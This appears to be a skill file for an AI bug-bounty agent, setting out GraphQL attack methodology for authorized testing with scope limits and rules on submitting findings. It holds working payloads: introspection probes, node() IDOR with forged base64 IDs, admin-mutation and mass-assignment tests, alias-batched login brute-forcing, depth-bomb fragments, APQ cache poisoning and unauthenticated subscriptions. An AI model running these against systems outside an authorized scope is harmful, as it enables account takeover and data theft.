---
name: graphql_hunter
description: GraphQL-specific attack methodology. Introspection-driven field/mutation authz gaps, alias batching, depth DoS, node() IDOR, subscription auth, persisted-query cache abuse. Distinct enough from REST to need its own pack.
---
# GraphQL Hunter

GraphQL endpoints concentrate three classes of bug that REST hides: schema-disclosed field-level authz gaps, alias-amplified rate-limit bypass, and Relay-style global-object IDOR. Programs frequently auto-reject "introspection alone" as a finding — the value of this pack is using the introspected schema to find the *next* bug, where the real money lives.

This pack composes with `shared/scope_guard.md`, `packs/web_hunter/SKILL.md` (general web techniques like CSRF and CORS that apply to GraphQL just like REST), `packs/api_security/SKILL.md` (auth-model fundamentals), `packs/triage_validation/SKILL.md` ("introspection alone" is on the never-submit list — chain it).

## When to Use

- Target exposes `/graphql`, `/api/graphql`, `/query`, or any endpoint that accepts `application/graphql` or JSON with `{"query": "..."}`.
- A JS bundle contains references to Apollo Client, urql, Relay, or hand-rolled GraphQL clients.
- A subscription WebSocket appears (`graphql-ws`, `subscriptions-transport-ws` protocols).
- A persisted-query endpoint (Apollo APQ) exists — `?ext=...{"persistedQuery":...}` patterns.

## Operating Rules

- Schema disclosure (introspection) on its own is on the never-submit list for most programs. The output of introspection is *input* to the actual finding — never submit a report whose only impact is "schema is public."
- Authorization gaps must be demonstrated cross-identity per `packs/triage_validation/SKILL.md` Q8 — a query that returns User B's data when called by User A's session is the finding; a query that returns User A's data is not.
- Batch/depth attacks have a DoS shape. Programs vary widely on whether they pay for DoS-style GraphQL findings. Probe with strict baseline → 2x → 5x amplification and stop; never run a sustained attack.
- Subscription attacks live on WebSockets — check program scope explicitly; some programs scope only the HTTP API.

## Phase 0: Fingerprint and Discovery

Before any attack, identify the engine and the schema.

```bash
# Fingerprint the GraphQL implementation
graphw00f -t https://target.com/graphql

# Introspection probe
curl -sX POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"query IntrospectionQuery { __schema { types { name kind } } }"}' \
  | jq .

# If introspection is blocked, fingerprint via error responses
clairvoyance -u https://target.com/graphql -w wordlist.txt
```

Common fingerprint outputs and what they imply:

| Engine | Common quirks |
|---|---|
| Apollo Server | Supports APQ; introspection often left on; alias batching unrestricted by default |
| graphql-yoga | Permissive defaults, often subscriptions over WS |
| Hasura | Auto-generates schema from Postgres; row-level security gaps are common |
| AWS AppSync | Custom resolvers; auth model is per-resolver |
| Postgraphile | Schema reflects PG; PG roles map to API roles |
| graphql-go (gqlgen) | Custom resolvers; field-level authz is per-resolver |
| GraphQL Java / Sangria | Often behind Spring Security — disagreement between framework auth and resolver auth |

## Phase 1: Field-Level Authorization Gaps

Once you have a schema, walk every type and ask: "is there a field here that should be private but is reachable through a query I can call?"

### A. Type-wide field exposure

```graphql
type User {
  id: ID!
  email: String        # Should be private
  passwordHash: String # Should never be exposed
  apiToken: String     # Should never be exposed
  internalNotes: String
  roles: [Role!]!
}
```

If `email`, `passwordHash`, or `apiToken` are in the schema but not in the JSON returned by the standard `me { id }` query, the field is gated. The bug is: is the gate at the query level (which leaks via aliasing or via reaching the type from a different parent), or at the field level (true protection)?

Test by reaching `User` from a different query:

```graphql
query CrossPath {
  posts(first: 10) {
    edges {
      node {
        author {
          email
          passwordHash
        }
      }
    }
  }
}
```

If `posts.edges.node.author.email` returns data that `me.email` would hide, the field gate is per-query, not per-type. That's the bug.

### B. Argument-level authz

```graphql
type Query {
  user(id: ID!): User
}
```

`user(id: <my-id>)` returns my user. Does `user(id: <victim-id>)` return the victim? If yes, it's IDOR. The fix is `user(id) requires owner === currentUser`; the bug is its absence.

### C. Relay `node()` IDOR

Relay-style schemas expose a top-level `node(id: GlobalID): Node` that returns any object by global ID. GlobalIDs are usually base64(`<TypeName>:<id>`).

```bash
# Decode any GlobalID seen in responses
echo 'VXNlcjox' | base64 -d   # "User:1"

# Probe other users
echo -n 'User:2' | base64       # "VXNlcjoy"
```

```graphql
query NodeIdor {
  node(id: "VXNlcjoy") {
    ... on User {
      email
      internalNotes
    }
  }
}
```

If `node(id: GlobalID)` lacks per-type authorization, this returns any user's data. Same applies to `Order`, `Document`, `Invoice`, `PrivateMessage`, etc.

## Phase 2: Mutation Authorization Gaps

Mutations are higher-impact (state-changing). The schema exposes mutations the UI never offers — these are commonly under-guarded.

### A. Schema-exposed admin mutations

```graphql
type Mutation {
  deleteUser(id: ID!): Boolean
  promoteToAdmin(id: ID!): User
  setUserEmail(id: ID!, email: String!): User
  resetUserPassword(id: ID!, newPassword: String!): Boolean
  ...
}
```

If the schema exposes `promoteToAdmin` and the resolver lacks an `isAdmin` check, calling it as a non-admin works. Test every admin-named mutation by calling it as a low-privilege user.

### B. Mass-assignment via input types

```graphql
input UpdateUserInput {
  email: String
  name: String
  role: String
  isAdmin: Boolean
}

mutation { updateUser(input: { ..., isAdmin: true }) { ... } }
```

If the input type accepts `isAdmin` and the resolver passes the whole input to the ORM without field-level filtering, mass-assignment escalates.

### C. Sibling-mutation gap

Per the chain-builder rule and `bb_methodology` sibling rule: if `updateMyProfile` is authz-guarded, is `updateUserProfile`? If `deleteMyComment` works, can `deleteComment(id: <other>)` succeed?

## Phase 3: Batch Attacks and Aliasing

### A. Alias batching

```graphql
query AliasBatch {
  a: login(user:"victim", pass:"a") { token }
  b: login(user:"victim", pass:"b") { token }
  c: login(user:"victim", pass:"c") { token }
  ...
}
```

A single GraphQL document with N login aliases bypasses per-request rate limits in implementations where the limit applies at the document level, not per-alias. Same applies to OTP-verify, password-reset-consume, voucher-redeem.

### B. Depth attacks

Circular fragment expansion blows up query cost exponentially. Probe with shallow depth first; document the implementation's depth limit and the impact when exceeded.

```graphql
fragment F on User { posts { author { ...F } } }
query DepthBomb { me { ...F } }
```

GraphQL implementations should ship with depth limits (graphql-depth-limit, query-complexity); the bug is "no limit configured."

### C. Persisted-query cache abuse (Apollo APQ)

Apollo's APQ caches queries by a SHA-256 hash sent in `extensions.persistedQuery.sha256Hash`. Two attacks:

- **Cache pollution**: send `query: <large-string>` with a fixed hash → server caches; subsequent requests with just the hash retrieve the large query. Costs the server CPU but is read-only.
- **Hash skipping**: some implementations of APQ skip the `query` field when the hash is present and assume cached. If the cache is shared across users, attacker poisons with a malicious query body and the next user retrieves it.

## Phase 4: Subscription Auth

GraphQL subscriptions over WebSocket frequently miss auth.

```javascript
// Standard subscription handshake (graphql-ws protocol)
ws.send(JSON.stringify({
  type: "connection_init",
  payload: { authToken: "Bearer <token>" }
}));

ws.send(JSON.stringify({
  type: "subscribe",
  id: "1",
  payload: { query: "subscription { newOrder { id, customer { email } } }" }
}));
```

Test:

- Omit the `authToken` in `connection_init` → does the server accept the connection?
- Subscribe to a subscription that should be admin-only (`newOrder`, `userActivity`, `paymentEvent`) → does data flow?
- Subscribe to another user's stream (`userMessages(userId: <victim>)`) → cross-identity test.

## Phase 5: Information Disclosure via Errors

GraphQL implementations often return verbose errors that leak schema details, file paths, SQL queries.

```graphql
query { someField(arg: "'") { id } }
```

The error response may include the underlying SQL, the resolver file path, or stack traces. Combine with introspection-blocked targets to recover schema from error messages.

## Phase 6: Suggestion Attacks

When introspection is disabled, GraphQL still helps the attacker via "Did you mean" suggestions:

```graphql
query { useer { id } }
```

Response: `Field "useer" not found. Did you mean "user"?`

This leaks field names without introspection. Use `clairvoyance` to brute-force a schema via suggestions.

## Submission Gates

Run `packs/triage_validation/SKILL.md` 7-Question gate. Then for this class:

- [ ] The finding is NOT "introspection alone" — there's a downstream gap demonstrated.
- [ ] Authz findings show cross-identity impact: User A's session reading User B's data, or low-priv reading high-priv.
- [ ] Batch findings include baseline (rate-limit triggers at N) → exceeded baseline (N×10 succeeds via aliasing).
- [ ] Mutation findings show the unauthorized state change persisted (re-fetch confirms the change).
- [ ] Subscription findings show real-time data leaked from another user's stream.

## Evidence

Store under the run artifact root, named `graphql_<target>_<timestamp>/`:

- `01_fingerprint.txt` — `graphw00f` output, `/graphql` introspection probe.
- `02_schema.json` — full introspection result (or clairvoyance-recovered partial).
- `03_finding.md` — the specific authz/batch/sub gap, with the exact query.
- `04_cross_identity_proof/` — request as User A → returns User B data; request as User B → returns User B data baseline.
- `README.md` — verified-vs-not table per `shared/evidence_rules.md`.

## Exclusions

- No DoS-grade depth or batch attacks. Probe and stop at proof of amplification.
- No subscription floods.
- No mutations that delete real users, modify real billing, or otherwise persist destructive state — own-account only.

## See Also

- `agent_skills/packs/api_security/SKILL.md` — auth model fundamentals shared with REST
- `agent_skills/packs/web_hunter/SKILL.md` — CSRF, CORS, browser-side attacks on GraphQL endpoints
- `agent_skills/packs/triage_validation/SKILL.md` — never-submit list (introspection alone)
- `agent_skills/packs/exploit_chainer/SKILL.md` — chains from GraphQL primitives
- External tools: `dolevf/graphw00f` (engine fingerprint), `nikitastupin/clairvoyance` (introspection fallback)
